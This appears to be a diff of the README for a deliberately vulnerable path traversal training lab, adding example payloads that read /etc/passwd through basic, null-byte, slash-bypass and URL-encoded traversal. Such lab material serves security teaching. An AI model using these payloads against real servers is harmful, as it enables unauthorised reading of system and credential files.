@@ -8,31 +8,55 @@ YrpreyPathTraversal is a framework that explains vulnerabilities of the Path Tra
 
 #### Exploitation - Path Traversal - Basic
 
-![yprey](https://i.imgur.com/6A5D5ir.png)
+![yprey](https://i.imgur.com/B2DpeSO.png)
 
-Note that all requests based on a name do not have hierarchy, organization, segmentation, or profiling. In other words, you can view the names of all users from any team.
+How exploit Path Taversal - Basic:
+
+````python
+
+ ../../../../etc/passwd
+
+````
 
 #### Exploitation - Path Traversal - Null Termination %00
 
-![yprey](https://i.imgur.com/eGoxe2f.png)
+![yprey](https://i.imgur.com/lT2VNWL.png)
 
-Change the token value, even if you enter the wrong username and password, you can authenticate with the token.
+How exploit Path Traversal - Null Termination %00:
+
+````python
+
+ ../../../../etc/passwd%00
+
+````
 
 
 
 #### Exploitation - Path Traversal - Bypass with caracteres "//" and/or "\/"
 
-![yprey](https://i.imgur.com/430Bkdb.png)
+![yprey](https://i.imgur.com/b6islHK.png)
 
-Enter the wrong username and password to obtain a valid token and use it on the API2:2023 tab to authenticate in the system.
+How exploit Path Traversal - Bypass with caracteres "//" and/or "\/"
+
+````python
+
+ ..//..//..//..//etc//passwd.
+
+````
 
 
 
 #### Exploitation - Path Traversal - Encoded %2f, %c0%af and %ef%bc%8f
 
-![yprey](https://i.imgur.com/t54w3FB.png)
+![yprey](https://i.imgur.com/6ov1ME4.png)
 
-Send an image number to the backend, for example 1,000,000. The frontend will receive the response and attempt to render it, causing an application exhaustion.
+How exploit Path Traversal - Encoded %2f, %c0%af and %ef%bc%8f
+
+````python
+
+ ..%2f..%2f..%2f..%2fetc%2fpasswd.
+
+````
 
 
 #### Features
